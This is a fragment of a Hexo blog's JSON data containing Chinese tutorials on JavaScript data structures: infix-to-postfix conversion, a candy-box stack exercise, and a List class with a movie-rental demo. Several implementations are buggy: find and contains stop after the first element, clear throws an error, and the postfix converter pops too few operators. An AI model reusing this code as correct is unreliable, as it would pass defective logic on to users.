title=\"概述\"></a>概述</h1><p>算术表达式中缀式转后缀式，例如”A+(B-C/D)<em>E” =&gt; “ABCD/-E</em>+” ; “A+B-C/D” =&gt; “AB+CD/-“。<br>算法思路：<a href=\"https://blog.csdn.net/allinone99/article/details/81297098\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/allinone99/article/details/81297098</a></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">infix2suffix</span>(<span class=\"params\">infixExp</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 判断操作符方法</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> isOperator = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">val</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [<span class=\"string\">\"+\"</span>, <span class=\"string\">\"-\"</span>, <span class=\"string\">\"*\"</span>, <span class=\"string\">\"/\"</span>, <span class=\"string\">\"^\"</span>, <span class=\"string\">\"(\"</span>, <span class=\"string\">\")\"</span>].indexOf(val) !== <span class=\"number\">-1</span>;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"comment\">// 计算优先级方法</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> getPriority = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">val</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> result = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (val) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">\"^\"</span>:</span><br><span class=\"line\">        result = <span class=\"number\">3</span>;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">\"*\"</span>:</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">\"/\"</span>:</span><br><span class=\"line\">        result = <span class=\"number\">2</span>;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">\"+\"</span>:</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">\"-\"</span>:</span><br><span class=\"line\">        result = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 操作符存放栈</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> operatorStack = <span class=\"keyword\">new</span> Stack();</span><br><span class=\"line\">  <span class=\"keyword\">let</span> suffixExp = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; infixExp.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> char = infixExp[i];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (isOperator(char)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (</span><br><span class=\"line\">        char === <span class=\"string\">\"(\"</span> ||</span><br><span class=\"line\">        operatorStack.length === <span class=\"number\">0</span> ||</span><br><span class=\"line\">        getPriority(char) &gt; getPriority(operatorStack.peek())</span><br><span class=\"line\">      ) &#123;</span><br><span class=\"line\">        operatorStack.push(char);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (char === <span class=\"string\">\")\"</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (!operatorStack.isEmpty()) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (operatorStack.peek() === <span class=\"string\">\"(\"</span>) &#123;</span><br><span class=\"line\">            operatorStack.pop();</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            suffixExp += operatorStack.pop();</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        suffixExp += operatorStack.pop();</span><br><span class=\"line\">        operatorStack.push(char);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      suffixExp += char;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 读取完成，则将栈中剩余的运算符依次弹出到后缀表达式</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (!operatorStack.isEmpty()) &#123;</span><br><span class=\"line\">    suffixExp += operatorStack.pop();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> suffixExp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> exp1 = <span class=\"string\">\"A+(B-C/D)*E\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> exp2 = <span class=\"string\">\"a+b*c+(d*e+f)*g\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> exp3 = <span class=\"string\">\"A+B-C/D\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(exp1 + <span class=\"string\">\" =&gt; \"</span> + infix2suffix(exp1));</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(exp2 + <span class=\"string\">\" =&gt; \"</span> + infix2suffix(exp2));</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(exp3 + <span class=\"string\">\" =&gt; \"</span> + infix2suffix(exp3));</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1>"},{"title":"数据结构与算法@佩兹糖果盒","date":"2019-05-17T08:31:30.000Z","updated":"2019-05-17T08:31:30.000Z","_content":"\n# 概述\n\n你有一盒佩兹糖果盒，里面塞满红、黄、白三中颜色的糖果，但是你不喜欢黄色口味的糖果。使用栈写一段程序，在不改变盒内其他糖果叠放顺序的基础上，将黄色糖果移出。\n\n<!-- more -->\n\n# 详述\n\n```js\nfunction pez(num) {\n  // 原始糖盒\n  var box = new Stack();\n  // 糖的数组\n  var sugars = [\"红\", \"黄\", \"白\"];\n\n  // 模拟放置糖：根据数量创建糖，并且放到糖盒\n  for (var i = 0; i < num; i++) {\n    var random = Math.floor(Math.random() * 3);\n    box.push(sugars[random]);\n  }\n\n  console.log(\"筛选前顺序：\" + box.dataStore);\n\n  // 辅助盒子\n  var buffer = new Stack();\n  // 筛选糖果\n  while (box.length() > 0) {\n    let sugar = box.pop();\n    if (sugar !== \"黄\") {\n      buffer.push(sugar);\n    }\n  }\n\n  // 清空数据\n  box.clear();\n\n  // 筛选后糖果依次放回原盒子\n  while (buffer.length() > 0) {\n    let sugar = buffer.pop();\n    box.push(sugar);\n  }\n  console.log(\"筛选后顺序：\" + box.dataStore);\n}\n\npez(20);\n```\n\n# 参考\n","source":"_posts/2019/05/数据结构与算法-佩兹糖果盒.md","raw":"---\ntitle: 数据结构与算法@佩兹糖果盒\npermalink: 数据结构与算法@佩兹糖果盒\ntags:\n  - JavaScript\ncategories:\n  - 基础\n  - 数据结构与算法\ndate: 2019-05-17 16:31:30\nupdated: 2019-05-17 16:31:30\n---\n\n# 概述\n\n你有一盒佩兹糖果盒，里面塞满红、黄、白三中颜色的糖果，但是你不喜欢黄色口味的糖果。使用栈写一段程序，在不改变盒内其他糖果叠放顺序的基础上，将黄色糖果移出。\n\n<!-- more -->\n\n# 详述\n\n```js\nfunction pez(num) {\n  // 原始糖盒\n  var box = new Stack();\n  // 糖的数组\n  var sugars = [\"红\", \"黄\", \"白\"];\n\n  // 模拟放置糖：根据数量创建糖，并且放到糖盒\n  for (var i = 0; i < num; i++) {\n    var random = Math.floor(Math.random() * 3);\n    box.push(sugars[random]);\n  }\n\n  console.log(\"筛选前顺序：\" + box.dataStore);\n\n  // 辅助盒子\n  var buffer = new Stack();\n  // 筛选糖果\n  while (box.length() > 0) {\n    let sugar = box.pop();\n    if (sugar !== \"黄\") {\n      buffer.push(sugar);\n    }\n  }\n\n  // 清空数据\n  box.clear();\n\n  // 筛选后糖果依次放回原盒子\n  while (buffer.length() > 0) {\n    let sugar = buffer.pop();\n    box.push(sugar);\n  }\n  console.log(\"筛选后顺序：\" + box.dataStore);\n}\n\npez(20);\n```\n\n# 参考\n","slug":"数据结构与算法@佩兹糖果盒","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xw007ewovvel643eun","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>你有一盒佩兹糖果盒，里面塞满红、黄、白三中颜色的糖果，但是你不喜欢黄色口味的糖果。使用栈写一段程序，在不改变盒内其他糖果叠放顺序的基础上，将黄色糖果移出。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pez</span>(<span class=\"params\">num</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 原始糖盒</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> box = <span class=\"keyword\">new</span> Stack();</span><br><span class=\"line\">  <span class=\"comment\">// 糖的数组</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> sugars = [<span class=\"string\">\"红\"</span>, <span class=\"string\">\"黄\"</span>, <span class=\"string\">\"白\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 模拟放置糖：根据数量创建糖，并且放到糖盒</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; num; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> random = <span class=\"built_in\">Math</span>.floor(<span class=\"built_in\">Math</span>.random() * <span class=\"number\">3</span>);</span><br><span class=\"line\">    box.push(sugars[random]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"筛选前顺序：\"</span> + box.dataStore);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 辅助盒子</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> buffer = <span class=\"keyword\">new</span> Stack();</span><br><span class=\"line\">  <span class=\"comment\">// 筛选糖果</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (box.length() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> sugar = box.pop();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (sugar !== <span class=\"string\">\"黄\"</span>) &#123;</span><br><span class=\"line\">      buffer.push(sugar);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 清空数据</span></span><br><span class=\"line\">  box.clear();</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 筛选后糖果依次放回原盒子</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (buffer.length() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> sugar = buffer.pop();</span><br><span class=\"line\">    box.push(sugar);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"筛选后顺序：\"</span> + box.dataStore);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">pez(<span class=\"number\">20</span>);</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1>","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>你有一盒佩兹糖果盒，里面塞满红、黄、白三中颜色的糖果，但是你不喜欢黄色口味的糖果。使用栈写一段程序，在不改变盒内其他糖果叠放顺序的基础上，将黄色糖果移出。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pez</span>(<span class=\"params\">num</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 原始糖盒</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> box = <span class=\"keyword\">new</span> Stack();</span><br><span class=\"line\">  <span class=\"comment\">// 糖的数组</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> sugars = [<span class=\"string\">\"红\"</span>, <span class=\"string\">\"黄\"</span>, <span class=\"string\">\"白\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 模拟放置糖：根据数量创建糖，并且放到糖盒</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; num; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> random = <span class=\"built_in\">Math</span>.floor(<span class=\"built_in\">Math</span>.random() * <span class=\"number\">3</span>);</span><br><span class=\"line\">    box.push(sugars[random]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"筛选前顺序：\"</span> + box.dataStore);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 辅助盒子</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> buffer = <span class=\"keyword\">new</span> Stack();</span><br><span class=\"line\">  <span class=\"comment\">// 筛选糖果</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (box.length() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> sugar = box.pop();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (sugar !== <span class=\"string\">\"黄\"</span>) &#123;</span><br><span class=\"line\">      buffer.push(sugar);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 清空数据</span></span><br><span class=\"line\">  box.clear();</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 筛选后糖果依次放回原盒子</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (buffer.length() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> sugar = buffer.pop();</span><br><span class=\"line\">    box.push(sugar);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"筛选后顺序：\"</span> + box.dataStore);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">pez(<span class=\"number\">20</span>);</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1>"},{"title":"数据结构与算法@列表","date":"2019-05-18T05:57:46.000Z","updated":"2019-05-18T05:57:46.000Z","_content":"\n# 概述\n\n当不需要再一个很长的序列中查找元素，或者对其进行排序时，列表显得尤为有用。反之，如果数据结构非常复杂，列表的作用就没那么大了。本篇主要讲如何在 JavaScript 中实现一个列表类。思维导图如下，具体细节见参考书籍，实现及常见使用场景见详述部分。\n![思维导图](0.svg)\n\n<!-- more -->\n\n# 详述\n\n## 实现列表类\n\n```js\nclass List {\n  constructor() {\n    this.listSize = 0;\n    this.pos = 0;\n    this.dataStore = []; //初始化一个空数组来保存列表元素\n  }\n  append(element) {\n    this.dataStore[this.listSize++] = element;\n  }\n  find(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return i;\n      }\n      return -1;\n    }\n  }\n  remove(element) {\n    let foundAt = this.find(element);\n    if (foundAt > -1) {\n      this.dataStore.splice(foundAt, 1);\n      this.listSize--;\n      return true;\n    }\n    return false;\n  }\n  lenth() {\n    return this.listSize;\n  }\n  toString() {\n    return this.dataStore;\n  }\n  insert(element, after) {\n    let insertPos = this.find(after);\n    if (insertPos > -1) {\n      this.dataStore.splice(insertPos, 0, element);\n      this.listSize++;\n      return true;\n    }\n    return false;\n  }\n  clear() {\n    delete this.dataStore;\n    this.dataStore.length = 0;\n    this.listSize = this.pos = 0;\n  }\n  contains(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return true;\n      }\n      return false;\n    }\n  }\n  front() {\n    this.pos = 0;\n  }\n  end() {\n    this.pos = this.listSize - 1;\n  }\n  prev() {\n    this.pos--;\n  }\n  next() {\n    this.pos++;\n  }\n  currPos() {\n    return this.pos;\n  }\n  moveTo(position) {\n    this.pos = position;\n  }\n  getElement() {\n    return this.dataStore[this.pos];\n  }\n  hasNext() {\n    return this.pos < this.listSize;\n  }\n  hasPrev() {\n    return this.pos >= 0;\n  }\n}\n\n// 测试\nlet names = new List();\nnames.append(\"jovy\");\nnames.append(\"sun\");\nnames.append(\"tom\");\nnames.append(\"lucy\");\nconsole.log(names);\n// List {\n//   listSize: 4,\n//   pos: 0,\n//   dataStore: [ 'jovy', 'sun', 'tom', 'lucy' ] }\nnames.next();\nnames.next();\nconsole.log(names.getElement());\n// tom\nnames.prev();\nconsole.log(names.getElement());\n// sun\n```\n\n## 使用迭代器访问列表\n\n```js\nconsole.log(\"1使用迭代器访问列表+++++++++++++++++\");\nfor (names.front(); names.hasNext(); names.next()) {\n  console.log(names.getElement());\n}\n// jovy\n// sun\n// tom\n// lucy\nconsole.log(\"2使用迭代器访问列表+++++++++++++++++\");\nfor (names.end(); names.hasPrev(); names.prev()) {\n  console.log(names.getElement());\n}\n// lucy\n// tom\n// sun\n// jovy\n```\n\n## 一个基于列表的应用\n\n模拟影碟租赁自助查询系统：查询可租借清单，查询用户租赁清单，用户租赁。\n\n```js\n// 定义客户类\nclass Customer {\n  constructor(name, movie) {\n    this.name = name;\n    this.movie = movie;\n  }\n}\n// 显示清单\nfunction displayList(list) {\n  for (list.front(); list.hasNext(); list.next()) {\n    if (list.getElement() instanceof Customer) {\n      console.log(\n        list.getElement()[\"name\"] + \", \" + list.getElement()[\"movie\"]\n      );\n    } else {\n      console.log(list.getElement());\n    }\n  }\n}\n\n// 检出电影\nfunction checkOut(name, movie, movieList, customerList) {\n  if (movieList.contains(movie)) {\n    let c = new Customer(name, movie);\n    customerList.append(c);\n    movieList.remove(movie);\n  } else {\n    console.log(movie + \" is not available.\");\n  }\n}\n\n// 测试+++++++++++++++++++++++++++++++\n// 模拟读取数据\nlet moviesStr =\n  \"肖申克的救赎，教父，教父2，低俗小说，黄金三镖客，十二怒汉，辛德勒名单，黑暗骑士，指环王：王者归来，搏击俱乐部，星球大战5：帝国反击战，飞越疯人院，指环王：护戒使者，盗梦空间，好家伙，星球大战，七武士，黑客帝国，阿甘正传，上帝之城\";\nlet movies = moviesStr.split(\"，\");\n\n// 使用列表管理电影数据\nlet movieList = new List();\nmovies.forEach(element => {\n  movieList.append(element);\n});\n// 使用列表管理客户数据\nlet customerList = new List();\n\nconsole.log(\"Available movies: \\n\");\ndisplayList(movieList);\ncheckOut(\"Jovysun\", \"教父\", movieList, customerList);\nconsole.log(\"\\nCustomer Rentals: \\n\");\ndisplayList(customerList);\nconsole.log(\"\\nMovies Now Available\\n\");\ndisplayList(movieList);\n```\n\n## 练习\n\n更多练习及实现答案请参考下一篇[数据结构——列表(练习题及实现)](/2019/04/29/data-structures-list-2)\n\n# 参考\n\n《数据结构与算法 JavaScript 描述》\n","source":"_posts/2019/05/数据结构与算法-列表.md","raw":"---\ntitle: 数据结构与算法@列表\npermalink: 数据结构与算法@列表\ntags:\n  - JavaScript\ncategories:\n  - 基础\n  - 数据结构与算法\ndate: 2019-05-18 13:57:46\nupdated: 2019-05-18 13:57:46\n---\n\n# 概述\n\n当不需要再一个很长的序列中查找元素，或者对其进行排序时，列表显得尤为有用。反之，如果数据结构非常复杂，列表的作用就没那么大了。本篇主要讲如何在 JavaScript 中实现一个列表类。思维导图如下，具体细节见参考书籍，实现及常见使用场景见详述部分。\n![思维导图](0.svg)\n\n<!-- more -->\n\n# 详述\n\n## 实现列表类\n\n```js\nclass List {\n  constructor() {\n    this.listSize = 0;\n    this.pos = 0;\n    this.dataStore = []; //初始化一个空数组来保存列表元素\n  }\n  append(element) {\n    this.dataStore[this.listSize++] = element;\n  }\n  find(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return i;\n      }\n      return -1;\n    }\n  }\n  remove(element) {\n    let foundAt = this.find(element);\n    if (foundAt > -1) {\n      this.dataStore.splice(foundAt, 1);\n      this.listSize--;\n      return true;\n    }\n    return false;\n  }\n  lenth() {\n    return this.listSize;\n  }\n  toString() {\n    return this.dataStore;\n  }\n  insert(element, after) {\n    let insertPos = this.find(after);\n    if (insertPos > -1) {\n      this.dataStore.splice(insertPos, 0, element);\n      this.listSize++;\n      return true;\n    }\n    return false;\n  }\n  clear() {\n    delete this.dataStore;\n    this.dataStore.length = 0;\n    this.listSize = this.pos = 0;\n  }\n  contains(element) {\n    for (let i = 0; i < this.dataStore.length; i++) {\n      if (this.dataStore[i] === element) {\n        return true;\n      }\n      return false;\n    }\n  }\n  front() {\n    this.pos = 0;\n  }\n  end() {\n    this.pos = this.listSize - 1;\n  }\n  prev() {\n    this.pos--;\n  }\n  next() {\n    this.pos++;\n  }\n  currPos() {\n    return this.pos;\n  }\n  moveTo(position) {\n    this.pos = position;\n  }\n  getElement() {\n    return this.dataStore[this.pos];\n  }\n  hasNext() {\n    return this.pos < this.listSize;\n  }\n  hasPrev() {\n    return this.pos >= 0;\n  }\n}\n\n// 测试\nlet names = new List();\nnames.append(\"jovy\");\nnames.append(\"sun\");\nnames.append(\"tom\");\nnames.append(\"lucy\");\nconsole.log(names);\n// List {\n//   listSize: 4,\n//   pos: 0,\n//   dataStore: [ 'jovy', 'sun', 'tom', 'lucy' ] }\nnames.next();\nnames.next();\nconsole.log(names.getElement());\n// tom\nnames.prev();\nconsole.log(names.getElement());\n// sun\n```\n\n## 使用迭代器访问列表\n\n```js\nconsole.log(\"1使用迭代器访问列表+++++++++++++++++\");\nfor (names.front(); names.hasNext(); names.next()) {\n  console.log(names.getElement());\n}\n// jovy\n// sun\n// tom\n// lucy\nconsole.log(\"2使用迭代器访问列表+++++++++++++++++\");\nfor (names.end(); names.hasPrev(); names.prev()) {\n  console.log(names.getElement());\n}\n// lucy\n// tom\n// sun\n// jovy\n```\n\n## 一个基于列表的应用\n\n模拟影碟租赁自助查询系统：查询可租借清单，查询用户租赁清单，用户租赁。\n\n```js\n// 定义客户类\nclass Customer {\n  constructor(name, movie) {\n    this.name = name;\n    this.movie = movie;\n  }\n}\n// 显示清单\nfunction displayList(list) {\n  for (list.front(); list.hasNext(); list.next()) {\n    if (list.getElement() instanceof Customer) {\n      console.log(\n        list.getElement()[\"name\"] + \", \" + list.getElement()[\"movie\"]\n      );\n    } else {\n      console.log(list.getElement());\n    }\n  }\n}\n\n// 检出电影\nfunction checkOut(name, movie, movieList, customerList) {\n  if (movieList.contains(movie)) {\n    let c = new Customer(name, movie);\n    customerList.append(c);\n    movieList.remove(movie);\n  } else {\n    console.log(movie + \" is not available.\");\n  }\n}\n\n// 测试+++++++++++++++++++++++++++++++\n// 模拟读取数据\nlet moviesStr =\n  \"肖申克的救赎，教父，教父2，低俗小说，黄金三镖客，十二怒汉，辛德勒名单，黑暗骑士，指环王：王者归来，搏击俱乐部，星球大战5：帝国反击战，飞越疯人院，指环王：护戒使者，盗梦空间，好家伙，星球大战，七武士，黑客帝国，阿甘正传，上帝之城\";\nlet movies = moviesStr.split(\"，\");\n\n// 使用列表管理电影数据\nlet movieList = new List();\nmovies.forEach(element => {\n  movieList.append(element);\n});\n// 使用列表管理客户数据\nlet customerList = new List();\n\nconsole.log(\"Available movies: \\n\");\ndisplayList(movieList);\ncheckOut(\"Jovysun\", \"教父\", movieList, customerList);\nconsole.log(\"\\nCustomer Rentals: \\n\");\ndisplayList(customerList);\nconsole.log(\"\\nMovies Now Available\\n\");\ndisplayList(movieList);\n```\n\n## 练习\n\n更多练习及实现答案请参考下一篇[数据结构——列表(练习题及实现)](/2019/04/29/data-structures-list-2)\n\n# 参考\n\n《数据结构与算法 JavaScript 描述》\n","slug":"数据结构与算法@列表","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xx007hwovvvzks7mwf","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>当不需要再一个很长的序列中查找元素，或者对其进行排序时，列表显得尤为有用。反之，如果数据结构非常复杂，列表的作用就没那么大了。本篇主要讲如何在 JavaScript 中实现一个列表类。思维导图如下，具体细节见参考书籍，实现及常见使用场景见详述部分。<br><img src=\"/数据结构与算法@列表/0.svg\" alt=\"思维导图\"></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a 